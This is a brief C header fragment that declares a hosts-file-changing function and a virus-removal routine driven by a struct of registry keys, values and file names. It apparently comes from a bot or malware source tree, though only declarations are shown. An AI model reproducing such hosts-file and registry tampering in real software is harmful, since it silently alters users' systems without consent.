#ifndef NO_HOSTCHANGE
void ChgHosts();
#endif
#ifndef NO_VIRUSREMOVE
void removevirus();

typedef struct VIRUSES 
{
	HKEY hkey;
	LPCTSTR subkey;
	LPCTSTR value;
	LPCTSTR name;
	LPCTSTR file;
} VIRUSES;
#endif
